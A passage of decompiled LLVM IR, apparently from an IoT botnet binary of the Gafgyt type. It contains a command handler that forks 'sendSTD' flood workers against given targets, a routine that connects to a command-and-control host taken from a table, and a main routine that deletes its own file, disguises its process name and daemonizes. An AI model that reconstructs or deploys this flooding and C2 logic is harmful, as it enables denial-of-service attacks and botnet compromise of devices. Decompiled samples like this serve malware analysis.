  %v2_9820 = inttoptr i32 %v1_9820 to i32*
  %v3_9820 = load i32, i32* %v2_9820, align 4
  %v1_9824 = inttoptr i32 %v3_9820 to i32*
  %v2_9824 = load i32, i32* %v1_9824, align 4
  %v1_982c = add i32 %v1_9800, 12
  %v2_982c = inttoptr i32 %v1_982c to i32*
  %v3_982c = load i32, i32* %v2_982c, align 4
  store i32 %v3_982c, i32* @r2, align 4
  %v2_9838 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_9838, i32* @r3, align 4
  %v4_9844 = call i32 @bcopy(i32 %v2_9824, i32 %v2_9838, i32 %v3_982c, i32 %v2_9838)
  %v1_984c = add i32 %v1_9800, 8
  %v2_984c = inttoptr i32 %v1_984c to i32*
  %v3_984c = load i32, i32* %v2_984c, align 4
  %v3_9854 = urem i32 %v3_984c, 65536
  store i32 %v3_9854, i32* %stack_var_-56, align 4
  %v2_98b0 = ptrtoint i32* %stack_var_-88 to i32
  %v2_98bc = bitcast i32* %stack_var_-88 to i8*
  %v2_9924 = add i32 %v2_97ec, %arg3
  %v2_98cc = add i32 %v13_97a8, -72
  br label %dec_label_pc_9874

dec_label_pc_9874:                                ; preds = %dec_label_pc_9950, %dec_label_pc_97d0
  %storemerge1 = phi i32 [ 0, %dec_label_pc_97d0 ], [ %v1_9954, %dec_label_pc_9950 ]
  %tmp = icmp ult i32 %storemerge1, 50
  br i1 %tmp, label %dec_label_pc_9950, label %dec_label_pc_9880

dec_label_pc_9880:                                ; preds = %dec_label_pc_9874
  %v2_9884 = call i32 @__GI_time(i32* null)
  %v1_9890 = call i32 @srand(i32 %v2_9884)
  %v1_9894 = call i32 @rand_init(i32 %v1_9890)
  %v0_9898 = call i32 @rand_next()
  %v1_98a0 = mul i32 %v0_9898, 4
  %v3_98a4 = and i32 %v1_98a0, 12
  %v1_98a8 = add nuw nsw i32 %v3_98a4, 12
  %v3_98bc = call i32 @rand_alphastr(i8* %v2_98bc, i32 %v1_98a8)
  %v2_98d0 = add i32 %v2_98cc, %v1_98a8
  %v3_98d8 = inttoptr i32 %v2_98d0 to i8*
  store i8 0, i8* %v3_98d8, align 4
  %v3_98e4 = load i32, i32* %stack_var_-104, align 4
  %v5_98f8 = call i32 @__libc_send(i32 %v3_97dc, i32 %v2_98b0, i32 %v3_98e4, i32 0, i32 %v2_98b0)
  %v3_990c = call i32 @__libc_connect(i32 %v3_97dc, i32 %v2_980c, i32 16)
  %v2_9914 = call i32 @__GI_time(i32* null)
  store i32 %v2_9914, i32* @r1, align 4
  %v5_992c = icmp slt i32 %v2_9914, %v2_9924
  br i1 %v5_992c, label %dec_label_pc_9948, label %dec_label_pc_9930

dec_label_pc_9930:                                ; preds = %dec_label_pc_9880
  %v1_9934 = call i32 @__GI___libc_close(i32 %v3_97dc)
  store i32 %v2_98b0, i32* @r0, align 4
  %v0_993c = call i32 @free()
  %v1_9944 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_9948

dec_label_pc_9948:                                ; preds = %dec_label_pc_9880, %dec_label_pc_9930
  br label %dec_label_pc_9950

dec_label_pc_9950:                                ; preds = %dec_label_pc_9874, %dec_label_pc_9948
  %stack_var_-28.0 = phi i32 [ %storemerge1, %dec_label_pc_9874 ], [ 0, %dec_label_pc_9948 ]
  %v1_9954 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_9874

dec_label_pc_9960:                                ; preds = %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v2_980c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9950, { 1, 0 }
  uselistorder label %dec_label_pc_9948, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v6_9970 = load i32, i32* @fp, align 4
  store i32 39288, i32* %stack_var_-4, align 4
  %v2_9974 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9974, i32* @fp, align 4
  %v2_9988 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i32]* @global_var_18a40.53 to i32), i32* @r1, align 4
  %v2_9994 = inttoptr i32 %v2_9988 to i8*
  %v3_9994 = call i32 @__GI_strcoll(i8* %v2_9994, i32 ptrtoint ([6 x i32]* @global_var_18a40.53 to i32))
  %v2_999c = icmp eq i32 %v3_9994, 0
  br i1 %v2_999c, label %dec_label_pc_99a4, label %dec_label_pc_9ac8

dec_label_pc_99a4:                                ; preds = %entry
  %v7_99ac = icmp slt i32 %arg1, 5
  br i1 %v7_99ac, label %dec_label_pc_9be0, label %dec_label_pc_99b0

dec_label_pc_99b0:                                ; preds = %dec_label_pc_99a4
  %v1_99b4 = add i32 %tmp, 4
  %v1_99b8 = inttoptr i32 %v1_99b4 to i32*
  %v2_99b8 = load i32, i32* %v1_99b8, align 4
  %v1_99c4 = add i32 %tmp, 8
  %v1_99c8 = inttoptr i32 %v1_99c4 to i32*
  %v2_99c8 = load i32, i32* %v1_99c8, align 4
  store i32 %v2_99c8, i32* @r0, align 4
  %v1_99d0 = call i32 @atol(i32 %v2_99c8)
  %v1_99e0 = add i32 %tmp, 12
  %v1_99e4 = inttoptr i32 %v1_99e0 to i32*
  %v2_99e4 = load i32, i32* %v1_99e4, align 4
  store i32 %v2_99e4, i32* @r0, align 4
  %v1_99ec = call i32 @atol(i32 %v2_99e4)
  %v1_99fc = add i32 %tmp, 16
  %v1_9a00 = inttoptr i32 %v1_99fc to i32*
  %v2_9a00 = load i32, i32* %v1_9a00, align 4
  store i32 %v2_9a00, i32* @r0, align 4
  %v1_9a08 = call i32 @atol(i32 %v2_9a00)
  store i32 %v2_99b8, i32* @r0, align 4
  %v2_9a20 = call i32 @__GI_strchr(i32 %v2_99b8, i32 44)
  %v2_9a28 = icmp eq i32 %v2_9a20, 0
  br i1 %v2_9a28, label %dec_label_pc_9a9c, label %dec_label_pc_9a30

dec_label_pc_9a30:                                ; preds = %dec_label_pc_99b0
  %v2_9a3c = call i32 @__GI_strtok(i32 %v2_99b8, i32 ptrtoint ([5 x i32]* @global_var_18a44.55 to i32))
  %v2_9a906 = icmp eq i32 %v2_9a3c, 0
  br i1 %v2_9a906, label %dec_label_pc_9ac8, label %dec_label_pc_9a4c

dec_label_pc_9a4c:                                ; preds = %dec_label_pc_9a30, %dec_label_pc_9a78
  %storemerge47 = phi i32 [ %v2_9a80, %dec_label_pc_9a78 ], [ %v2_9a3c, %dec_label_pc_9a30 ]
  %v0_9a4c = call i32 @listFork()
  %v2_9a54 = icmp eq i32 %v0_9a4c, 0
  br i1 %v2_9a54, label %dec_label_pc_9a5c, label %dec_label_pc_9a78

dec_label_pc_9a5c:                                ; preds = %dec_label_pc_9a4c
  %v4_9a6c = call i32 @sendSTD(i32 %storemerge47, i32 %v1_99d0, i32 %v1_99ec, i32 %v1_9a08)
  %v1_9a74 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_9a78

dec_label_pc_9a78:                                ; preds = %dec_label_pc_9a4c, %dec_label_pc_9a5c
  %v2_9a80 = call i32 @__GI_strtok(i32 0, i32 ptrtoint ([5 x i32]* @global_var_18a44.55 to i32))
  %v2_9a90 = icmp eq i32 %v2_9a80, 0
  br i1 %v2_9a90, label %dec_label_pc_9ac8, label %dec_label_pc_9a4c

dec_label_pc_9a9c:                                ; preds = %dec_label_pc_99b0
  %v0_9a9c = call i32 @listFork()
  %v2_9aa4 = icmp eq i32 %v0_9a9c, 0
  br i1 %v2_9aa4, label %dec_label_pc_9aac, label %dec_label_pc_9be0

dec_label_pc_9aac:                                ; preds = %dec_label_pc_9a9c
  %v4_9abc = call i32 @sendSTD(i32 %v2_99b8, i32 %v1_99d0, i32 %v1_99ec, i32 %v1_9a08)
  %v1_9ac4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_9ac8

dec_label_pc_9ac8:                                ; preds = %dec_label_pc_9a78, %dec_label_pc_9a30, %entry, %dec_label_pc_9aac
  %v2_9acc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i32]* @global_var_18a48.57 to i32), i32* @r1, align 4
  %v2_9ad8 = inttoptr i32 %v2_9acc to i8*
  %v3_9ad8 = call i32 @__GI_strcoll(i8* %v2_9ad8, i32 ptrtoint ([4 x i32]* @global_var_18a48.57 to i32))
  %v2_9ae0 = icmp eq i32 %v3_9ad8, 0
  br i1 %v2_9ae0, label %dec_label_pc_9ae8, label %dec_label_pc_9be0

dec_label_pc_9ae8:                                ; preds = %dec_label_pc_9ac8
  br label %dec_label_pc_9b8c

dec_label_pc_9afc:                                ; preds = %dec_label_pc_9b8c, %dec_label_pc_9bc0
  %v3_9b00 = mul i32 %v3_9bd4, 4
  %v2_9b0c = load i32, i32* @global_var_25264.51, align 4
  %v2_9b10 = add i32 %v2_9b0c, %v3_9b00
  %v1_9b14 = inttoptr i32 %v2_9b10 to i32*
  %v2_9b14 = load i32, i32* %v1_9b14, align 4
  %v2_9b18 = icmp eq i32 %v2_9b14, 0
  br i1 %v2_9b18, label %dec_label_pc_9b80, label %dec_label_pc_9b20

dec_label_pc_9b20:                                ; preds = %dec_label_pc_9afc
  %v2_9b38 = load i32, i32* %v1_9b14, align 4
  %v0_9b3c = call i32 @__getpid()
  %v9_9b44 = icmp eq i32 %v2_9b38, %v0_9b3c
  br i1 %v9_9b44, label %dec_label_pc_9b80, label %dec_label_pc_9b4c

dec_label_pc_9b4c:                                ; preds = %dec_label_pc_9b20
  %v2_9b5c = load i32, i32* @global_var_25264.51, align 4
  %v2_9b60 = add i32 %v2_9b5c, %v3_9b00
  %v1_9b64 = inttoptr i32 %v2_9b60 to i32*
  %v2_9b64 = load i32, i32* %v1_9b64, align 4
  %v3_9b70 = call i32 @kill(i32 %v2_9b64, i32 9, i32 %v3_9b00)
  %v1_9b78 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_9b80

dec_label_pc_9b80:                                ; preds = %dec_label_pc_9b20, %dec_label_pc_9afc, %dec_label_pc_9b4c
  %v1_9be89 = phi i32 [ %v1_9be810, %dec_label_pc_9afc ], [ %v0_9b3c, %dec_label_pc_9b20 ], [ %v3_9b70, %dec_label_pc_9b4c ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.1, %dec_label_pc_9afc ], [ %stack_var_-32.1, %dec_label_pc_9b20 ], [ %v1_9b78, %dec_label_pc_9b4c ]
  %v1_9b84 = add i32 %v3_9bd4, 1
  br label %dec_label_pc_9b8c

dec_label_pc_9b8c:                                ; preds = %dec_label_pc_9ae8, %dec_label_pc_9b80
  %v1_9be810 = phi i32 [ 0, %dec_label_pc_9ae8 ], [ %v1_9be89, %dec_label_pc_9b80 ]
  %stack_var_-32.1 = phi i32 [ 0, %dec_label_pc_9ae8 ], [ %stack_var_-32.0, %dec_label_pc_9b80 ]
  %v3_9bd4 = phi i32 [ 0, %dec_label_pc_9ae8 ], [ %v1_9b84, %dec_label_pc_9b80 ]
  %v5_9ba4 = load i32, i32* @global_var_22584.49, align 4
  %v9_9bb8 = icmp eq i32 %v5_9ba4, 0
  br i1 %v9_9bb8, label %dec_label_pc_9bc0, label %dec_label_pc_9afc

dec_label_pc_9bc0:                                ; preds = %dec_label_pc_9b8c
  %v2_9ba4 = load i32, i32* @global_var_22580.48, align 4
  %tmp30 = icmp ugt i32 %v2_9ba4, %v3_9bd4
  br i1 %tmp30, label %dec_label_pc_9afc, label %dec_label_pc_9be0

dec_label_pc_9be0:                                ; preds = %dec_label_pc_9bc0, %dec_label_pc_9a9c, %dec_label_pc_9ac8, %dec_label_pc_99a4
  %v1_9be8 = phi i32 [ %v0_9a9c, %dec_label_pc_9a9c ], [ %v3_9ad8, %dec_label_pc_9ac8 ], [ 0, %dec_label_pc_99a4 ], [ %v1_9be810, %dec_label_pc_9bc0 ]
  store i32 %v6_9970, i32* @fp, align 4
  ret i32 %v1_9be8

; uselistorder directives
  uselistorder i32 %stack_var_-32.1, { 0, 2, 1 }
  uselistorder i32 %v3_9b00, { 0, 2, 1 }
  uselistorder i32 %v2_9a80, { 1, 0 }
  uselistorder i32 %v1_9a08, { 1, 0 }
  uselistorder i32 %v1_99ec, { 1, 0 }
  uselistorder i32 %v1_99d0, { 1, 0 }
  uselistorder i32 %v2_99b8, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 ()* @listFork, { 1, 0 }
  uselistorder label %dec_label_pc_9be0, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_9b8c, { 1, 0 }
  uselistorder label %dec_label_pc_9b80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9afc, { 1, 0 }
  uselistorder label %dec_label_pc_9ac8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9a78, { 1, 0 }
  uselistorder label %dec_label_pc_9a4c, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9c04 = load i32, i32* @fp, align 4
  store i32 39948, i32* %stack_var_-4, align 4
  %v2_9c08 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c08, i32* @fp, align 4
  %v2_9c1c = ptrtoint i32* %stack_var_-4116 to i32
  %v3_9c2c = bitcast i32* %stack_var_-4116 to i8*
  %v4_9c2c = call i32 @__GI_memset(i8* %v3_9c2c, i32 0, i32 4096)
  %v2_9c34 = load i32, i32* @global_var_22588.46, align 4
  %v2_9c38 = icmp eq i32 %v2_9c34, 0
  br i1 %v2_9c38, label %dec_label_pc_9c5c, label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %entry
  %v1_9c4c = call i32 @__GI___libc_close(i32 %v2_9c34)
  store i32 0, i32* @global_var_22588.46, align 4
  br label %dec_label_pc_9c5c

dec_label_pc_9c5c:                                ; preds = %entry, %dec_label_pc_9c40
  %v2_9c60 = load i32, i32* @global_var_2234c.62, align 4
  %v2_9c64 = icmp eq i32 %v2_9c60, 0
  br i1 %v2_9c64, label %dec_label_pc_9c90, label %dec_label_pc_9c7c

dec_label_pc_9c7c:                                ; preds = %dec_label_pc_9c5c
  %v1_9c84 = add i32 %v2_9c60, 1
  br label %dec_label_pc_9c90

dec_label_pc_9c90:                                ; preds = %dec_label_pc_9c5c, %dec_label_pc_9c7c
  %storemerge1 = phi i32 [ %v1_9c84, %dec_label_pc_9c7c ], [ 0, %dec_label_pc_9c5c ]
  store i32 %storemerge1, i32* @global_var_2234c.62, align 4
  %v4_9ca8 = mul i32 %storemerge1, 4
  %v5_9ca8 = add i32 %v4_9ca8, ptrtoint ([14 x i8]** @global_var_22348.65 to i32)
  %v6_9ca8 = inttoptr i32 %v5_9ca8 to i32*
  %v7_9ca8 = load i32, i32* %v6_9ca8, align 4
  store i32 %v7_9ca8, i32* @r1, align 4
  %v3_9cb4 = call i32 @strcpy(i8* %v3_9c2c, i32 %v7_9ca8)
  store i32 %v2_9c1c, i32* @r0, align 4
  %v2_9cd8 = call i32 @__GI_strchr(i32 %v2_9c1c, i32 58)
  %v2_9ce0 = icmp eq i32 %v2_9cd8, 0
  br i1 %v2_9ce0, label %dec_label_pc_9d40, label %dec_label_pc_9ce8

dec_label_pc_9ce8:                                ; preds = %dec_label_pc_9c90
  store i32 %v2_9c1c, i32* @r0, align 4
  %v2_9cfc = call i32 @__GI_strchr(i32 %v2_9c1c, i32 58)
  %v1_9d04 = add i32 %v2_9cfc, 1
  store i32 %v1_9d04, i32* @r0, align 4
  %v1_9d0c = call i32 @atol(i32 %v1_9d04)
  store i32 %v2_9c1c, i32* @r0, align 4
  %v2_9d2c = call i32 @__GI_strchr(i32 %v2_9c1c, i32 58)
  %v3_9d3c = inttoptr i32 %v2_9d2c to i8*
  store i8 0, i8* %v3_9d3c, align 1
  br label %dec_label_pc_9d40

dec_label_pc_9d40:                                ; preds = %dec_label_pc_9c90, %dec_label_pc_9ce8
  %stack_var_-20.0 = phi i32 [ 69000, %dec_label_pc_9c90 ], [ %v1_9d0c, %dec_label_pc_9ce8 ]
  %v3_9d4c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9d4c, i32* @global_var_22588.46, align 4
  %v4_9d80 = call i32 @connectTimeout(i32 %v3_9d4c, i32 %v2_9c1c, i32 %stack_var_-20.0, i32 30)
  %v2_9d88 = icmp eq i32 %v4_9d80, 0
  %. = zext i1 %v2_9d88 to i32
  store i32 %v3_9c04, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_9c1c, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_9d40, { 1, 0 }
  uselistorder label %dec_label_pc_9c90, { 1, 0 }
  uselistorder label %dec_label_pc_9c5c, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-4284 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40412, i32* %stack_var_-4, align 4
  %v2_9dd8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9dd8, i32* @fp, align 4
  %v2_9dec = ptrtoint i32* %stack_var_-24 to i32
  %v1_9e14 = bitcast i8** %argv to i32*
  %v2_9e14 = load i32, i32* %v1_9e14, align 4
  %v3_9e1c = call i32 @unlink(i32 %v2_9e14, i32 %v2_9dec, i32 %v2_9dec)
  %v1_9e20 = call i32 @rand_init(i32 %v3_9e1c)
  %v0_9e24 = call i32 @rand_next()
  %v1_9e2c = mul i32 %v0_9e24, 4
  %v3_9e30 = and i32 %v1_9e2c, 12
  %v1_9e34 = add nuw nsw i32 %v3_9e30, 12
  %v2_9e3c = ptrtoint i32* %stack_var_-112 to i32
  %v2_9e48 = bitcast i32* %stack_var_-112 to i8*
  %v3_9e48 = call i32 @rand_alphastr(i8* %v2_9e48, i32 %v1_9e34)
  %v2_9e58 = add i32 %v2_9dec, -88
  %v2_9e5c = add i32 %v2_9e58, %v1_9e34
  %v3_9e64 = inttoptr i32 %v2_9e5c to i8*
  store i8 0, i8* %v3_9e64, align 4
  %v2_9e78 = load i32, i32* %v1_9e14, align 4
  %v3_9e88 = call i32 @util_strcpy(i32 %v2_9e78, i32 %v2_9e3c, i32 %v2_9e3c)
  %v0_9e8c = call i32 @rand_next()
  %v1_9e98 = zext i32 %v0_9e8c to i64
  %v4_9e98 = mul nuw i64 %v1_9e98, 2863311531
  %v3_9e9c6 = udiv i64 %v4_9e98, 17179869184
  %v2_9eb08 = mul nuw nsw i64 %v3_9e9c6, 2
  %v2_9eb0 = trunc i64 %v2_9eb08 to i32
  %v3_9eb410 = mul nuw nsw i64 %v3_9e9c6, 8
  %v3_9eb4 = trunc i64 %v3_9eb410 to i32
  %v2_9eb853 = sub i32 %v2_9eb0, %v3_9eb4
  %v2_9ebc = add i32 %v2_9eb853, %v0_9e8c
  %v3_9ed0 = mul i32 %v2_9ebc, 4
  %v1_9ed4 = add i32 %v3_9ed0, 12
  %v6_9ee8 = call i32 @rand_alphastr(i8* %v2_9e48, i32 %v1_9ed4)
  %v2_9efc = add i32 %v2_9e58, %v1_9ed4
  %v3_9efc = inttoptr i32 %v2_9efc to i8*
  store i8 0, i8* %v3_9efc, align 4
  %v5_9f14 = call i32 @prctl(i32 15, i32 %v2_9e3c, i32 %v2_9efc, i32 %v2_9e3c)
  %v2_9f1c = call i32 @__GI_time(i32* null)
  store i32 %v2_9f1c, i32* @r4, align 4
  %v0_9f24 = call i32 @__getpid()
  %v0_9f2c = load i32, i32* @r4, align 4
  %v2_9f2c = xor i32 %v0_9f2c, %v0_9f24
  %v1_9f34 = call i32 @srand(i32 %v2_9f2c)
  %v1_9f38 = call i32 @rand_init(i32 %v1_9f34)
  %v0_9f3c = call i32 @__libc_fork()
  %v2_9f4c = icmp eq i32 %v0_9f3c, 0
  br i1 %v2_9f4c, label %dec_label_pc_9f7c, label %dec_label_pc_9f70

dec_label_pc_9f70:                                ; preds = %entry
  %v2_9f54 = ptrtoint i32* %stack_var_-148 to i32
  %v3_9f64 = call i32 @__libc_waitpid(i32 %v0_9f3c, i32 %v2_9f54, i32 0)
  %v1_9f6c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9f9c

dec_label_pc_9f7c:                                ; preds = %entry
  %v0_9f7c = call i32 @__libc_fork()
  %v2_9f8c = icmp eq i32 %v0_9f7c, 0
  br i1 %v2_9f8c, label %dec_label_pc_9f9c, label %dec_label_pc_9f94

dec_label_pc_9f94:                                ; preds = %dec_label_pc_9f7c
  %v1_9f98 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9f9c

dec_label_pc_9f9c:                                ; preds = %dec_label_pc_9f70, %dec_label_pc_9f7c, %dec_label_pc_9f94
  %v1_9fa0 = call i32 @chdir(i32 ptrtoint ([3 x i32]* @global_var_18a4c.68 to i32))
  %v2_9fac = call i32 @bsd_signal(i32 13, i32 1)
  %v2_a634 = ptrtoint i32* %stack_var_-4284 to i32
  %v4_a644 = bitcast i32* %stack_var_-4284 to i8*
  %v1_a364 = or i32 %v2_a634, 1
  %v5_a368 = inttoptr i32 %v1_a364 to i8*
  %v2_a5f4 = add i32 %v2_9dec, -164
  br label %dec_label_pc_9fb0

dec_label_pc_9fb0:                                ; preds = %dec_label_pc_9fb0, %dec_label_pc_a624, %dec_label_pc_9f9c
  %v0_9fb0 = call i32 @initConnection()
  %v2_9fb8 = icmp eq i32 %v0_9fb0, 0
  br i1 %v2_9fb8, label %dec_label_pc_9fc0, label %dec_label_pc_9fb0

dec_label_pc_9fc0:                                ; preds = %dec_label_pc_9fb0
  br label %dec_label_pc_a624

dec_label_pc_9fe0:                                ; preds = %dec_label_pc_a29c, %dec_label_pc_a240
  %v3_9fe4 = mul i32 %v3_a290, 4
  %v2_9ff0 = load i32, i32* @global_var_25264.51, align 4
  %v2_9ff4 = add i32 %v2_9ff0, %v3_9fe4
  %v1_9ff8 = inttoptr i32 %v2_9ff4 to i32*
  %v2_9ff8 = load i32, i32* %v1_9ff8, align 4
  %v3_a008 = call i32 @__libc_waitpid(i32 %v2_9ff8, i32 0, i32 1)
  %tmp98 = icmp slt i32 %v3_a008, 1
  br i1 %tmp98, label %dec_label_pc_a234, label %dec_label_pc_a06c

dec_label_pc_a028:                                ; preds = %dec_label_pc_a0c8, %dec_label_pc_a06c
  %v2_a02c = load i32, i32* @global_var_25264.51, align 4
  %v3_a038 = mul i32 %v1_a01c, 4
  %v1_a030 = add i32 %v3_a038, -4
  %v2_a03c = add i32 %v1_a030, %v2_a02c
  %v2_a054 = add i32 %v2_a02c, %v3_a038
  %v1_a058 = inttoptr i32 %v2_a054 to i32*
  %v2_a058 = load i32, i32* %v1_a058, align 4
  %v2_a05c = inttoptr i32 %v2_a03c to i32*
  store i32 %v2_a058, i32* %v2_a05c, align 4
  br label %dec_label_pc_a06c

dec_label_pc_a06c:                                ; preds = %dec_label_pc_9fe0, %dec_label_pc_a028
  %v3_a018.sink = phi i32 [ %v1_a01c, %dec_label_pc_a028 ], [ %v3_a290, %dec_label_pc_9fe0 ]
  %v1_a01c = add i32 %v3_a018.sink, 1
  %v2_a088 = load i32, i32* @global_var_22580.48, align 4
  %v5_a088 = load i32, i32* @global_var_22584.49, align 4
  %tmp99 = icmp ugt i32 %v5_a088, %v1_a01c
  br i1 %tmp99, label %dec_label_pc_a028, label %dec_label_pc_a0b0

dec_label_pc_a0b0:                                ; preds = %dec_label_pc_a06c
  %v9_a0c0 = icmp eq i32 %v5_a088, %v1_a01c
  br i1 %v9_a0c0, label %dec_label_pc_a0c8, label %dec_label_pc_a0e0

dec_label_pc_a0c8:                                ; preds = %dec_label_pc_a0b0
  %v9_a0d8 = icmp eq i32 %v2_a088, 0
  br i1 %v9_a0d8, label %dec_label_pc_a0e0, label %dec_label_pc_a028

dec_label_pc_a0e0:                                ; preds = %dec_label_pc_a0c8, %dec_label_pc_a0b0
  %v2_a0e4 = load i32, i32* @global_var_25264.51, align 4
  %v3_a0f0 = mul i32 %v1_a01c, 4
  %v1_a0e8 = add i32 %v3_a0f0, -4
  %v2_a0f4 = add i32 %v1_a0e8, %v2_a0e4
  %v2_a0fc = inttoptr i32 %v2_a0f4 to i32*
  store i32 0, i32* %v2_a0fc, align 4
  %v2_a104 = load i32, i32* @global_var_22580.48, align 4
  %v5_a104 = load i32, i32* @global_var_22584.49, align 4
  %v2_a110 = add i32 %v2_a104, -1
  %v3_a110 = icmp ne i32 %v2_a104, 0
  %v3_a114 = add i32 %v5_a104, -1
  %v4_a114 = zext i1 %v3_a110 to i32
  %v5_a114 = add i32 %v3_a114, %v4_a114
  store i32 %v2_a110, i32* @global_var_22580.48, align 4
  store i32 %v5_a114, i32* @global_var_22584.49, align 4
  %v3_a130 = icmp eq i32 %v2_a104, 0
  %v4_a134 = zext i1 %v3_a130 to i32
  %v5_a134 = add i32 %v5_a114, %v4_a134
  %v3_a138 = udiv i32 %v2_a104, 1073741824
  %v3_a13c = mul i32 %v5_a134, 4
  %v2_a140 = or i32 %v3_a13c, %v3_a138
  store i32 %v2_a140, i32* @r4, align 4
  %v3_a144 = mul i32 %v2_a104, 4
  %v1_a14c = call i32 @malloc(i32 %v3_a144)
  br label %dec_label_pc_a1a4

dec_label_pc_a164:                                ; preds = %dec_label_pc_a200, %dec_label_pc_a1a4
  %v3_a168 = mul i32 %v3_a1f4, 4
  %v2_a174 = add i32 %v3_a168, %v1_a14c
  %v2_a188 = load i32, i32* @global_var_25264.51, align 4
  %v2_a18c = add i32 %v2_a188, %v3_a168
  %v1_a190 = inttoptr i32 %v2_a18c to i32*
  %v2_a190 = load i32, i32* %v1_a190, align 4
  %v2_a194 = inttoptr i32 %v2_a174 to i32*
  store i32 %v2_a190, i32* %v2_a194, align 4
  %v1_a19c = add i32 %v3_a1f4, 1
  br label %dec_label_pc_a1a4

dec_label_pc_a1a4:                                ; preds = %dec_label_pc_a0e0, %dec_label_pc_a164
  %v3_a1f4 = phi i32 [ 0, %dec_label_pc_a0e0 ], [ %v1_a19c, %dec_label_pc_a164 ]
  %v2_a1c0 = load i32, i32* @global_var_22580.48, align 4
  %v5_a1c0 = load i32, i32* @global_var_22584.49, align 4
  %tmp101 = icmp ugt i32 %v5_a1c0, %v3_a1f4
  br i1 %tmp101, label %dec_label_pc_a164, label %dec_label_pc_a1e8

dec_label_pc_a1e8:                                ; preds = %dec_label_pc_a1a4
  %v9_a1f8 = icmp eq i32 %v5_a1c0, %v3_a1f4
  br i1 %v9_a1f8, label %dec_label_pc_a200, label %dec_label_pc_a218

dec_label_pc_a200:                                ; preds = %dec_label_pc_a1e8
  %v9_a210 = icmp eq i32 %v2_a1c0, 0
  br i1 %v9_a210, label %dec_label_pc_a218, label %dec_label_pc_a164

dec_label_pc_a218:                                ; preds = %dec_label_pc_a200, %dec_label_pc_a1e8
  %v2_a21c = load i32, i32* @global_var_25264.51, align 4
  store i32 %v2_a21c, i32* @r0, align 4
  %v0_a224 = call i32 @free()
  store i32 %v1_a14c, i32* @global_var_25264.51, align 4
  br label %dec_label_pc_a234

dec_label_pc_a234:                                ; preds = %dec_label_pc_9fe0, %dec_label_pc_a218
  %v1_a238 = add i32 %v3_a290, 1
  br label %dec_label_pc_a240

dec_label_pc_a240:                                ; preds = %dec_label_pc_a624, %dec_label_pc_a234
  %v3_a290 = phi i32 [ %v1_a238, %dec_label_pc_a234 ], [ 0, %dec_label_pc_a624 ]
  %v3_a248 = ashr i32 %v3_a290, 31
  %v2_a25c = load i32, i32* @global_var_22580.48, align 4
  %v5_a25c = load i32, i32* @global_var_22584.49, align 4
  %v3_a27c = icmp uge i32 %v5_a25c, %v3_a290
  %v9_a27c = icmp eq i32 %v5_a25c, %v3_a290
  %v2_a280 = xor i1 %v9_a27c, true
  %v3_a280 = and i1 %v3_a27c, %v2_a280
  br i1 %v3_a280, label %dec_label_pc_9fe0, label %dec_label_pc_a284

dec_label_pc_a284:                                ; preds = %dec_label_pc_a240
  br i1 %v9_a27c, label %dec_label_pc_a29c, label %dec_label_pc_a2b4

dec_label_pc_a29c:                                ; preds = %dec_label_pc_a284
  %tmp = icmp ugt i32 %v2_a25c, %v3_a248
  br i1 %tmp, label %dec_label_pc_9fe0, label %dec_label_pc_a2b4

dec_label_pc_a2b4:                                ; preds = %dec_label_pc_a284, %dec_label_pc_a29c
  %v2_a2c8 = add i32 %v5_a644, %v2_a634
  %v3_a2d0 = inttoptr i32 %v2_a2c8 to i8*
  store i8 0, i8* %v3_a2d0, align 1
  %v2_a2e4 = call i32 @trim(i8* %v4_a644)
  %v2_a2fc = load i8, i8* %v4_a644, align 4
  %v7_a300 = icmp eq i8 %v2_a2fc, 46
  br i1 %v7_a300, label %dec_label_pc_a324, label %dec_label_pc_a624

dec_label_pc_a324:                                ; preds = %dec_label_pc_a2b4, %dec_label_pc_a334
  %v3_a308.sink = phi i8* [ %storemerge13, %dec_label_pc_a334 ], [ %v4_a644, %dec_label_pc_a2b4 ]
  %v4_a308 = ptrtoint i8* %v3_a308.sink to i32
  %v1_a30c = add i32 %v4_a308, 1
  %storemerge13 = inttoptr i32 %v1_a30c to i8*
  %v2_a328 = load i8, i8* %storemerge13, align 1
